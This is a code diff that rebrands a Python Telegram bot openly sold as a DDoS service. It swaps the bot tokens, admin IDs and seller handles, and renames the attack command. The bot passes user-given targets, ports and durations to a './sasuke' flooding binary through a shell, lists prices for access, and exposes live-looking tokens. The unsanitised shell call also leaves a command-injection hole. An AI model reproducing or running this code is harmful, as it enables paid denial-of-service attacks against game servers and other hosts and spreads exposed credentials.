@@ -19,10 +19,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('6985771977:AAHs45lBA9nZ93YsOjhr0LPxjsb6UMctdsg') #telegram bot token from botfather
+bot = telebot.TeleBot('7900762158:AAGowcCVti_iQ3ZWJrZikeRfdTxVcvLv4mg') #telegram bot token from botfather
 
 # Admin user IDs
-admin_id = ["6159360725"] #admin id your tg id
+admin_id = ["6423399272"] #admin id your tg id
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -114,7 +114,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID to add."
     else:
-        response = "Only Admin Can Run This Command by STORM BOT."
+        response = "Only Admin Can Run This Command by @Nitesh_021."
 
     bot.reply_to(message, response)
 
@@ -219,7 +219,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊1 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy STORM BOT @BeasTxt_Sasuke"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊1 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy @Nitesh_021"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -228,7 +228,7 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =10 #cooldown if need
 
 # Handler for /attack1 command
-@bot.message_handler(commands=['attack1'])
+@bot.message_handler(commands=['attack'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -250,16 +250,16 @@ def handle_bgmi(message):
             if time > 240:
                 response = "Error: Time interval must be less than 240."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./sasuke {target} {port} {time} 30"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack1 Finished. Target: {target} Port: {port} Time: {time}"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /attack1 <target> <port> <time>\nBy Stoℝᴍ𒆜 BGMI | PVT | SEASON @BeasTxt_Sasuke"  # Updated command syntax
+            response = "Usage :- /attack <target> <port> <time>\nBy @Nitesh_021"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\nBy STORM BOT @bgmisellingbuying"
+        response = "You Are Not Authorized To Use This Command.\nBy @Nitesh_021"
 
     bot.reply_to(message, response)
 
@@ -296,7 +296,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By STORM BOT https://t.me/bgmisellingbuying
+@Nitesh_021
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -311,7 +311,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy STORM BOT @https://t.me/bgmisellingbuying"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @Nitesh_021"
     bot.reply_to(message, response)
 
 
@@ -323,7 +323,7 @@ def welcome_rules(message):
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-By STORM BOT FOR key dm @BeasTxt_Sasuke https://t.me/bgmisellingbuying'''
+By STORM BOT FOR key @Nitesh_021'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan']) #expire after 2 oct
@@ -340,9 +340,7 @@ Pr-ice List:
 Day--> 50 Rs
 Week--> 190 Rs
 Month--> 600 Rs
-DM @BeasTxt_Sasuke
-By Stoℝᴍ𒆜 BGMI | PVT | SEASON
-By STORM BOT https://t.me/bgmisellingbuying
+DM @Nitesh_021
 '''
     bot.reply_to(message, response)
 
@@ -357,7 +355,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By Stoℝᴍ𒆜 BGMI | PVT | SEASON https://t.me/bgmisellingbuying
+By @Nitesh_021
 '''
     bot.reply_to(message, response)
 
@@ -388,7 +386,7 @@ def broadcast_message(message):
 
 
 bot.polling()
-#By Stoℝᴍ𒆜 BGMI | PVT | SEASON https://t.me/bgmisellingbuying
+#@Nitesh_021
 #key_expire_2oct
 #valid till unchange
 #anychange_pyoff
